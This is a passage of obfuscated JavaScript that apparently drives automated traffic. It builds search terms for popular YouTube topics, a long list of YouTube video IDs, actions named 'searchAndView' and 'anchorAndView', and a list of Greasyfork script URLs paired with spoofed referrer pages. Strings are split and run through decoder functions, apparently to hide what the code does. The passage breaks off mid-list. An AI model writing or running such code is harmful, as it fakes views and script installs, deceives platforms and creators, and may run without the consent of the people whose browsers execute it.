searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + X(0x3, '[Kk3') + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + Y(0x13) + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + W(0x11) + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x16ea + 0x2706 + 0x1012 * -0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xb8b + 0x1 * -0x6d3 + -0x4ae)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + W(0x16) + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x3f * -0x1c + 0x50c + -0xbed);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    Y(0x17) + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    X(0x7, 'f5az') + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    W(0x1d) + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    X(0x10, '^X3N') + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + W(0x1b) + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + W(0xd)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + X(0x6, 'Uktw'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
